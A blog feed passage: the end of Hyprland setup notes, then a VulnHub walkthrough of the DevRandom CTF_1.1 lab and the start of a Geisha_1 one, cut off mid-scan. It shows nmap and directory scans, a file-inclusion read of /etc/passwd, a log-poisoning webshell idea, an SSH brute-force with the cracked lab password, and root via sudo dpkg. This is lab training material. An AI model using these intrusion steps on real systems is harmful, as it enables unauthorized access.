查看手册更加详细，而且分类方便查找）：<ul><li>win + D 启动 Wolf，类似于程序菜单</li><li>win + Q 关闭这个窗口</li><li>win + Enter 开启 terminal</li><li>win + shift + W 切换 waybar 图标（界面上方的任务栏）</li><li>win + B 关闭 Waybar</li><li>win + alt + W 切换 wayber 的位置</li><li>win + ctrl + W 指定壁纸切换</li><li>win + W 切换壁纸</li><li>win + shift + S 手动截图</li><li>win + shift + prtsc 手动截图并保存</li><li>win + alt + V 查看剪切板历史，双击复制</li><li>win + T 开启文件管理器</li></ul></li><li>窗口调节快捷键<ul><li>win + shift + 空格: 浮动窗口模式</li><li>win + 鼠标左键: 可拖动窗口</li><li>win + 鼠标右键: 可调整窗口大小</li><li>win + 数字: 进入到指定桌面</li><li>win + shift + 数字: 将窗口扔进某个桌面</li><li>win + tab 切换桌面</li><li>win + 空格：多窗口时调整窗口位置（需要鼠标配合）</li></ul></li><li>分辨率调整 ok 后如果希望调整字体大小，需要使用 GTK Setings 中的 font 选项卡</li></ul></li><li><a href="https://www.bilibili.com/read/cv22707313/">ArchLinux下Hyprland配置指北 - 哔哩哔哩 (bilibili.com)</a><ul><li>关于输入法，第一个链接中是使用的系统设置，但我的情况只能手动设置，设置方法参考此链接中提到的添加 <code>exec-once=fcitx5 --replace -d</code> 到某个文件中</li></ul></li><li>部分时候你可能需要挂代理</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=http://127.0.0.1:8888<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=http://127.0.0.1:8888<br></code></pre></td></tr></table></figure><ul><li><a href="https://zhuanlan.zhihu.com/p/579004291">wayland下使用腾讯会议分享屏幕 - 知乎 (zhihu.com)</a><ul><li>腾讯会议现在已经快成必需品了，这个链接是一种解决腾讯会议在 wayland 中无法共享的方法（显示有问题可以使用 wemeet-x11 ）</li><li>你可能需要先使用 <code>sudo pacman -S linux-headers</code><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 安装</span><br>yay -S obs-studio xdg-desktop-portal-lxqt xdg-desktop-portal-wlr v4l2loopback-dkms xdg-desktop-portal<br><span class="hljs-comment"># 创建虚拟摄像头</span><br>sudo modprobe v4l2loopback <span class="hljs-attribute">devices</span>=1 <span class="hljs-attribute">video_nr</span>=10 <span class="hljs-attribute">card_label</span>=<span class="hljs-string">&#x27;OBS Cam&#x27;</span> <span class="hljs-attribute">exclusive_caps</span>=1<br>sudo modprobe snd-aloop <span class="hljs-attribute">index</span>=10 <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;OBS Mic&#x27;</span><br>pacmd <span class="hljs-string">&#x27;update-source-proplist alsa_input.platform-snd_aloop.0.analog-stereo device.description=&quot;OBS Mic&quot;&#x27;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><p><img src="/pic/bf4cafa802a3d273bcd0751ef023f1d0_MD5.png"></p><ul><li>中文输入法还是有问题<ul><li>我无能为力，我也面临着这个问题，不过我容忍了它，重启了一次自己好了</li><li>建议你参考<a href="https://wiki.archlinux.org/index.php/Fcitx5_" title="%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">Fcitx5 官方文档</a></li></ul></li><li>声音无法控制<ul><li>我也遇到了，但是多次重启之后，莫名其妙又行了</li></ul></li><li>分辨率问题<ul><li>调整 Mirrors.conf 即可</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>zheteng</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DevRandom CTF_1.1 靶机</title>
    <link href="/2023/08/ddeff39afd9a.html"/>
    <url>/2023/08/ddeff39afd9a.html</url>
    
    <content type="html"><![CDATA[<h1 id="DevRandom-CTF-1-1-靶机"><a href="#DevRandom-CTF-1-1-靶机" class="headerlink" title="DevRandom CTF_1.1 靶机"></a>DevRandom CTF_1.1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/devrandomCTF_v1.1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.137                      <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 21:50 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.137<br>Host is up (0.00042s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:4F:E8:0F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.13 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/devrandomCTF_v1.1]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.137                    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 21:50 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.137<br>Host is up (0.00042s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 83:e5:a1:51:b1:f6:98:d3:19:e7:59:10:f7:f4:e8:5e (RSA)<br>|   256 b2:a6:79:c3:ad:2f:ba:cc:02:b3:42:0d:a2:a3:9e:60 (ECDSA)<br>|_  256 ec:1f:d4:29:9f:a5:ae:ca:93:f4:a8:6b:fd:61:44:45 (ED25519)<br>80/tcp open  http    Apache httpd<br>| http-robots.txt: 3 disallowed entries <br>|_/wp-admin/ /wp-login.php /?include=info<br>|_http-server-header: Apache<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">MAC Address: 08:00:27:4F:E8:0F (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 15.46 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/devrandomCTF_v1.1]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.137             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 21:55 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.137<br>Host is up (0.00062s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-csrf: Couldn\t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /wp-login.php: Possible admin folder<br>|   /log.php: Logs<br>|   /robots.txt: Robots file<br>|   /readme.html: Wordpress version: 2 <br>|   /wp-includes/images/rss.png: Wordpress version 2.2 found.<br>|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.<br>|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.<br>|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.<br>|   /wp-login.php: Wordpress login page.<br>|   /wp-admin/upgrade.php: Wordpress login page.<br>|   /readme.html: Interesting, a readme.<br>|_  /secret/: Potentially interesting folder w/ directory listing<br>MAC Address: 08:00:27:4F:E8:0F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 37.88 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/devrandomCTF_v1.1]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.137   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 22:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.137<br>Host is up (0.00042s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:4F:E8:0F (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>暴露面很窄，感觉只有目录爆破可以再尝试一下（废话，除了目录爆破也没别的突破点了）</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破来一遍，gobuster 和 dirsearch 都试一下</p><p><img src="/pic/2dfec09a9fc75cb465ad67856dc3dd7d_MD5.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.137</span>/<br></code></pre></td></tr></table></figure><p><img src="/pic/f2b50b4c3d5203693403edafba8f6452_MD5.png"></p><p>汇总一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">/secret/<br>/arizona<br>API:4395874598yt3r9iy98r7r90t87treterrrrr<br>/wrap<br>john:Password123<br><br>/robots.txt<br>/?include=info<br><br>/log.php<br>记录了访问信息包含用户的访问路径和User-Agent<br><br>/secret.php<br>API:341290e945c081fc3c8e2c8f2b7294ca<br></code></pre></td></tr></table></figure><p>我尝试了使用上述用户名和密码登录，失败；尝试使用 API 的值作为密码登录，失败；最后通过 fuzz 来对 <code>/?include=info</code> 进行尝试，发现存在文件包含漏洞</p><p><img src="/pic/f09785e32c4a36cb2a0f406db7092daa_MD5.png"></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>尝试读取 passwd 文件</p><p><img src="/pic/3ff8ca19c791bb0c2f609f79c44db3ae_MD5.png"></p><p>得到了几个用户名，从 Web 中再没有找到别的攻击路径（实际上是我没想到，不过另一个攻击路径实际使用有点问题）</p><p>尝试了读取一些敏感文件，包括 shadow 文件、家目录下的历史文件、ssh 私钥文件，均失败，还尝试了访问 <code>wp-config.php</code> 文件，同样失败（失败指无回显）</p><p>接下来尝试了 ssh 爆破，但是爆破时间实在太长了，陷入了深深的自我怀疑，又去看了眼 WP，原来真的需要跑那么久。实测使用收集到的多个用户名作为用户名字典，rockyou 作为爆破密码字典，爆破时长远大于 4h</p><p>没这么大耐心，去 WP 看看有没有别的思路。其中有一篇博客提到：log.php 中存储了用户可控的 User-Agent 字段，可以写入一句话木马来实现 getshell，实测遇到了以下问题</p><p><img src="/pic/f5909d57751148b1905c7450ca8e72d3_MD5.png"></p><p>原本 log.php 回显的日志，被存储到了 access.log 而且文件包含漏洞还无法反弹 shell</p><h2 id="ssh-爆破"><a href="#ssh-爆破" class="headerlink" title="ssh 爆破"></a>ssh 爆破</h2><p>又只能回到爆破的思路中，直接看了别人的爆破结果 <code>qwertyuiop[]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/devrandomCTF_v1.1]<br>└─$ ssh trevor@192.168.56.137<br>trevor@192.168.56.137\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Mar 23 17:54:37 2020</span><br><span class="hljs-string">trevor@lucifer:~$ whoami</span><br><span class="hljs-string">trevor</span><br><span class="hljs-string">trevor@lucifer:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:4f:e8:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.137/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 454sec preferred_lft 454sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe4f:e80f/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">trevor@lucifer:~$ id</span><br><span class="hljs-string">uid=1005(trevor) gid=1005(trevor) groups=1005(trevor)</span><br><span class="hljs-string">trevor@lucifer:~$ sudo -l</span><br><span class="hljs-string">Matching Defaults entries for trevor on lucifer:</span><br><span class="hljs-string">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="hljs-string"></span><br><span class="hljs-string">User trevor may run the following commands on lucifer:</span><br><span class="hljs-string">    (root) NOPASSWD: /usr/bin/dpkg</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo -l 给了无需密码可执行的 dpkg 命令，在 gtfobins 中找到了利用手法</p><p><img src="/pic/c4f26d34c14bcb0391628a7d621e5e50_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lucifer:/home/trevor<span class="hljs-comment"># whoami</span><br>root<br>root@lucifer:/home/trevor<span class="hljs-comment"># cd /root</span><br>root@lucifer:~<span class="hljs-comment"># ls</span><br>flag.txt<br>root@lucifer:~<span class="hljs-comment"># cat flag.txt</span><br>WELl DONE<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;THISISTHEFLAGTHISISTHEFLAG\!\!\!\@\@\@###&quot;</span> | <span class="hljs-built_in">base64</span> &gt; thisistheflag.txt<br></code></pre></td></tr></table></figure><p>结束战斗</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Geisha_1 靶机</title>
    <link href="/2023/08/9ad2d44c60f1.html"/>
    <url>/2023/08/9ad2d44c60f1.html</url>
    
    <content type="html"><![CDATA[<h1 id="Geisha-1-靶机"><a href="#Geisha-1-靶机" class="headerlink" title="Geisha_1 靶机"></a>Geisha_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.145                                                    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 22:52 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.145<br>Host is up (0.00011s latency).<br>Not shown: 65528 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>7080/tcp open  empowerid<br>7125/tcp open  unknown<br>8088/tcp open  radan-http<br>9198/tcp open  unknown<br>MAC Address: 00:0C:29:B4:24:08 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.59 seconds<br></code></pre></td></tr></table></figure><p>开放端口比较多，兔子洞概率较大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,80,7080,7125,8088,9198 192.1.1.145<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 22:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.145<br>Host is up (0.00026s latency).<br><br>PORT     STATE SERVICE  VERSION<br>21/tcp   open  ftp      vsftpd 3.0.3<br>22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 1b:f2:5d:<span class="hljs-built_in">cd</span>:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)<br>|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:<span class="hljs-built_in">fc</span>:49:e0:5f (ECDSA)<br>|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)<br>80/tcp   open  http     Apache httpd 2.4.38 ((Debian))<br>|_http-server-header: Apache/2.4.38 (Debian)<br>|_http-title: Geisha<br>7080/tcp open  ssl/http LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US<br>| Not valid before: 2020-05-09T14:01:34<br>|_Not valid after:  2022-05-09T14:01:34<br>| tls-alpn: <br>|   h2<br>|   spdy/3<br>|   spdy/2<br>|_  http/1.1<br>|_http-title: Geisha<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>7125/tcp open  http     nginx 1.17.10<br>|_http-title: Geisha<br>|_http-server-header: nginx/1.17.10<br>8088/tcp open  http     LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>|_http-title: Geisha<br>9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)<br>|_http-server-header: SimpleHTTP/0.6 Python/2.7.16<br>|_http-title: Geisha<br>MAC Address: 00:0C:29:B4:24:08 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 36.05 seconds<br></code></pre></td></tr></table></figure><p>信息比较杂乱，先把三板斧走完</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Geisha_1]<br>└─$ sudo nmap --script=vuln -p21,22,80,7080,7125,8088,9198 192.1.1.145<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 22:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.145<br>Host is up (0.00025s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /info.php: Possible information file</span><br><span class="hljs-string">7080/tcp open  empowerid</span><br><span class="hljs-string">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-litespeed-sourcecode-download: </span><br><span class="hljs-string">| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)</span><br><span class="hljs-string">| /index.php source code:</span><br><span class="hljs-string">| &lt;html&gt;&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="hljs-string">| &lt;h2&gt;HTTPS is required&lt;/h2&gt;</span><br><span class="hljs-string">| &lt;p&gt;This is an SSL protected page, please use the HTTPS scheme instead of the plain HTTP scheme to access this URL.&lt;br /&gt;</span><br><span class="hljs-string">| &lt;blockquote&gt;Hint: The URL should starts with &lt;b&gt;https&lt;/b&gt;://&lt;/blockquote&gt; &lt;/p&gt;</span><br><span class="hljs-string">| &lt;hr /&gt;</span><br><span class="hljs-string">| Powered By LiteSpeed Web Server&lt;br /&gt;</span><br><span class="hljs-string">| &lt;a href=&#x27;</span>http://www.litespeedtech.com<span class="hljs-string">&#x27;&gt;&lt;i&gt;http://www.litespeedtech.com&lt;/i&gt;&lt;/a&gt;</span><br><span class="hljs-string">|_&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       